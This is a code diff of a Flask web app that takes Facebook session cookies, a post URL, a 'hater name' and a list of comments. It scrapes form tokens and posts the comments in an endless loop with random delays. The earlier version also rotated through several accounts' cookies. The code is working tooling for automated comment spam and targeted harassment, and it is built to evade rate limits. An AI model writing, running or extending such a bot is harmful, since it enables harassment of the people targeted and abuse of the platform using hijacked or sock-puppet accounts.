@@ -1,15 +1,11 @@
 from flask import Flask, render_template, request, jsonify
 import requests
-import os
 import re
 import time
 import threading
 import random
 import string
-import json
 from datetime import datetime
-from requests.exceptions import RequestException
-from urllib.parse import urlparse, parse_qs
 
 app = Flask(__name__)
 
@@ -24,11 +20,9 @@ class FacebookCommenter:
         self.start_time = datetime.now()
         self.is_running = True
         self.last_status = "Initializing"
-        self.comment_loop = True
         
     def stop_task(self):
         self.is_running = False
-        self.comment_loop = False
         
     def get_status(self):
         return {
@@ -39,91 +33,66 @@ class FacebookCommenter:
         }
     
     def extract_post_id(self, url):
-        """Extract post ID from various Facebook URL formats"""
-        try:
-            # Standard post URL pattern
-            if "/posts/" in url:
-                return re.search(r'/posts/([^/?]+)', url).group(1)
-            
-            # Photo/video post pattern
-            elif "/photos/" in url or "/videos/" in url:
-                return re.search(r'fbid=([0-9]+)', url).group(1)
-            
-            # Permalink/story pattern
-            elif "/permalink.php" in url or "/story.php" in url:
-                return re.search(r'story_fbid=([0-9]+)', url).group(1)
-            
-            # Fallback - numeric post ID
-            match = re.search(r'/([0-9]+)/?$', url)
+        """Extract post ID from Facebook URL"""
+        patterns = [
+            r'/posts/([^/?]+)',
+            r'story_fbid=([0-9]+)',
+            r'/([0-9]+)/?$',
+            r'fbid=([0-9]+)'
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, url)
             if match:
                 return match.group(1)
-                
-            return None
-        except Exception as e:
-            self.last_status = f"URL Error: {str(e)}"
-            return None
-
-    def parse_cookies(self, cookie_input):
-        """Handle both raw cookies and JSON format"""
-        try:
-            # Try to parse as JSON
-            cookie_data = json.loads(cookie_input)
-            if isinstance(cookie_data, dict):
-                return "; ".join(f"{k}={v}" for k, v in cookie_data.items())
-            elif isinstance(cookie_data, list):
-                return [self.parse_cookies(c) for c in cookie_data]
-            return cookie_input.strip()
-        except json.JSONDecodeError:
-            # Treat as raw cookie string
-            return cookie_input.strip()
+        return None
 
     def verify_cookies(self, cookies):
-        """Check if cookies provide valid login"""
+        """Check if cookies are valid"""
         try:
             response = requests.get(
                 'https://mbasic.facebook.com/me',
                 cookies={"cookie": cookies},
                 headers={'User-Agent': 'Mozilla/5.0'},
-                timeout=10,
-                allow_redirects=False
+                timeout=10
             )
-            return response.status_code == 200 and 'c_user' in cookies
+            return 'logout.php' not in response.url and 'c_user' in cookies
         except:
             return False
 
-    def comment_on_post(self, cookies, post_url, comment, hater_name, last_name):
+    def send_comment(self, cookies, post_url, comment_text, hater_name, last_name):
         try:
             post_id = self.extract_post_id(post_url)
             if not post_id:
                 self.last_status = "Invalid post URL"
                 return False
 
-            parsed_cookies = self.parse_cookies(cookies)
-            if not self.verify_cookies(parsed_cookies):
-                self.last_status = "Invalid cookies"
+            if not self.verify_cookies(cookies):
+                self.last_status = "Invalid cookies - login failed"
                 return False
 
             session = requests.Session()
-            session.cookies.update({"cookie": parsed_cookies})
+            session.cookies.update({"cookie": cookies})
             session.headers.update({
                 'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
-                'Referer': post_url
+                'Referer': 'https://mbasic.facebook.com'
             })
 
             # Load post page
-            mbasic_url = f'https://mbasic.facebook.com/{post_id}'
-            response = session.get(mbasic_url)
+            response = session.get(f'https://mbasic.facebook.com/{post_id}')
             
-            # Find comment form
+            # Find comment form parameters
             fb_dtsg = re.search('name="fb_dtsg" value="([^"]+)"', response.text)
             jazoest = re.search('name="jazoest" value="([^"]+)"', response.text)
             
             if not fb_dtsg or not jazoest:
-                self.last_status = "Form fields missing"
+                self.last_status = "Could not find comment form"
                 return False
 
+            # Prepare formatted comment
+            formatted_comment = f"{hater_name} {comment_text} {last_name}"
+            
             # Submit comment
-            formatted_comment = f"{hater_name} {comment.strip()} {last_name}"
             response = session.post(
                 'https://mbasic.facebook.com/a/comment.php',
                 data={
@@ -136,10 +105,10 @@ class FacebookCommenter:
 
             if response.status_code == 200:
                 self.comment_count += 1
-                self.last_status = f"Posted: {formatted_comment}"
+                self.last_status = f"Comment posted: {formatted_comment}"
                 return True
             else:
-                self.last_status = f"Failed ({response.status_code})"
+                self.last_status = f"Failed with status {response.status_code}"
                 return False
 
         except Exception as e:
@@ -155,18 +124,21 @@ class FacebookCommenter:
             hater_name = config['hater_name']
             last_name = config['last_name']
             
-            cookie_index = 0
             comment_index = 0
             
-            while self.is_running and self.comment_loop:
-                current_cookie = cookies[cookie_index % len(cookies)]
+            while self.is_running:
                 current_comment = comments[comment_index % len(comments)]
                 
-                self.comment_on_post(current_cookie, post_url, current_comment, hater_name, last_name)
+                self.send_comment(
+                    cookies, 
+                    post_url, 
+                    current_comment, 
+                    hater_name, 
+                    last_name
+                )
                 
                 comment_index += 1
-                cookie_index += 1
-                time.sleep(max(5, delay + random.uniform(-2, 2)))  # Minimum 5 sec delay
+                time.sleep(delay + random.uniform(1, 3))  # Random delay
                 
         except Exception as e:
             self.last_status = f"Task Error: {str(e)}"
@@ -182,29 +154,29 @@ def home():
 @app.route('/start_task', methods=['POST'])
 def start_task():
     try:
-        # Get input data
-        cookies = request.form.get('cookies', '').splitlines()
-        comments = request.form.get('comments', '').splitlines()
-        post_url = request.form.get('post_url', '').strip()
-        hater_name = request.form.get('hater_name', '').strip()
-        last_name = request.form.get('last_name', '').strip()
-        delay = int(request.form.get('delay', 10))
+        data = request.json
         
-        # Validate
-        if not all([cookies, comments, post_url, hater_name, last_name]):
+        # Validate all required fields
+        required_fields = ['cookies', 'post_url', 'hater_name', 'last_name', 'comments', 'delay']
+        if not all(data.get(field) for field in required_fields):
             return jsonify({'status': 'error', 'message': 'All fields are required'})
         
         # Create task
         task_id = ''.join(random.choices(string.digits, k=8))
         config = {
-            'cookies': [c.strip() for c in cookies if c.strip()],
-            'comments': [c.strip() for c in comments if c.strip()],
-            'post_url': post_url,
-            'hater_name': hater_name,
-            'last_name': last_name,
-            'delay': delay
+            'cookies': data['cookies'].strip(),
+            'post_url': data['post_url'].strip(),
+            'hater_name': data['hater_name'].strip(),
+            'last_name': data['last_name'].strip(),
+            'comments': [c.strip() for c in data['comments'].split('\n') if c.strip()],
+            'delay': max(5, int(data['delay']))  # Minimum 5 second delay
         }
         
+        # Verify cookies first
+        if not FacebookCommenter(task_id).verify_cookies(config['cookies']):
+            return jsonify({'status': 'error', 'message': 'Invalid cookies - login failed'})
+        
+        # Start task
         commenter = FacebookCommenter(task_id)
         thread = threading.Thread(target=commenter.run_task, args=(config,))
         thread.daemon = True
@@ -216,7 +188,7 @@ def start_task():
         return jsonify({
             'status': 'success',
             'task_id': task_id,
-            'message': f'Task {task_id} started'
+            'message': 'Task started successfully'
         })
         
     except Exception as e:
@@ -227,7 +199,7 @@ def stop_task(task_id):
     with task_lock:
         if task_id in active_tasks:
             active_tasks[task_id].stop_task()
-            return jsonify({'status': 'success', 'message': f'Task {task_id} stopped'})
+            return jsonify({'status': 'success', 'message': 'Task stopped'})
         return jsonify({'status': 'error', 'message': 'Task not found'})
 
 @app.route('/task_status/<task_id>')
@@ -237,14 +209,5 @@ def task_status(task_id):
             return jsonify({'status': 'success', 'data': active_tasks[task_id].get_status()})
         return jsonify({'status': 'error', 'message': 'Task not found'})
 
-@app.route('/active_tasks')
-def get_active_tasks():
-    with task_lock:
-        return jsonify({
-            'status': 'success',
-            'data': {task_id: task.get_status() for task_id, task in active_tasks.items()}
-        })
-
 if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=5000)
